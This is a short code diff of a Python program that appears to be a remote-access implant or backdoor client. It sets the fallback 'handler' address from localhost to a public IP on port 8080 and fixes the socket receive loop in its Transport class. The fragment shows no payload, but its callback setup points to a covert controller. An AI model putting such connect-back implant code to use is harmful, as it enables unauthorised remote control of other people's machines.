@@ -38,7 +38,7 @@ try:
 		HANDLER_IP = HANDLER_IP[:-1]
 except Exception as e:
 	logging.debug("We're uncompyled, let's use these values...")
-	HANDLER_IP = "127.0.0.1"
+	HANDLER_IP = "88.156.10.253"
 	HANDLER_PORT = 8080
 
 def windows_only(func):
@@ -298,7 +298,11 @@ class Transport:
 		try:
 			data = ""
 			while not data.endswith(chr(255)):
-				data += self.comm_socket.recv(4096)
+				temp = self.comm_socket.recv(4096)
+				if not temp:
+					data = None
+					break
+				data += temp
 			data = data[:-1]
 		except: data = ""
 		
@@ -575,5 +579,4 @@ while True:
 			
 if __name__ == "__main__":
 	main()
-
-
+	
